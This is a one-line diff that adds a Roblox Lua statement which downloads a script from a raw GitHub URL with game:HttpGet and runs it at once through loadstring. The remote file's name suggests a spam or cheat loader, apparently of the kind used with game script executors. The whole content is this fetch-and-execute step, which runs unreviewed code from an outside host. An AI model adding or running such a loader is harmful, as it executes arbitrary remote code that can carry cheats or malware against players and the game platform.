@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SlowDamselLog/loaders/main/loaders/apple-ipad-original-spam6-amnh1yxso6dhu5.lua"))()
